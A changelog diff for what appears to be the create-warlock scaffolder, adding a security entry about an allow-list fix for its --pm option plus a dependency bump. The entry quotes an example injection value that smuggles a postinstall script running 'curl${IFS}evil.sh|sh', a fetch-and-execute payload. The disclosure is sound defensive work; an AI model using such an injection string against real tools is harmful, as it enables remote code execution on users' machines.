@@ -6,6 +6,10 @@ The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/).
 
 ## 4.15.0
 
+### Security
+
+- **`--pm` is now validated against an allow-list (`npm`/`yarn`/`pnpm`/`bun`) before it reaches anything.** Previously an arbitrary `--pm` string flowed straight into `spawn()` as the executable to run *and* was spliced verbatim into the generated `package.json`'s script text before that text is parsed as JSON — a crafted value (e.g. `--pm='pnpm","postinstall":"curl${IFS}evil.sh|sh#'`) could inject a `postinstall` script that the scaffolder's own automatic `install()` step would then execute, or invoke an arbitrary binary on `PATH` outright. `--yes`/non-interactive scaffolds now reject any `--pm` outside the allow-list and exit before the package manager is set, closing both sinks at the source; the interactive prompt was already safe (its options are drawn from the allow-list, never free text).
+
 ### Dependencies
 
 - Bumped `@mongez/reinforcements` to `^4.0.1` (package dependency + project template). This is a **major** bump: `Random.string/nanoid/id/token/uuid` are now CSPRNG-backed (WebCrypto) and no longer honor `Random.seed()`, and throw without WebCrypto available. Audited `create-warlock`'s own source and the `templates/warlock` scaffold for `Random.seed`/`Random.*` usage — none found, no code changes required.
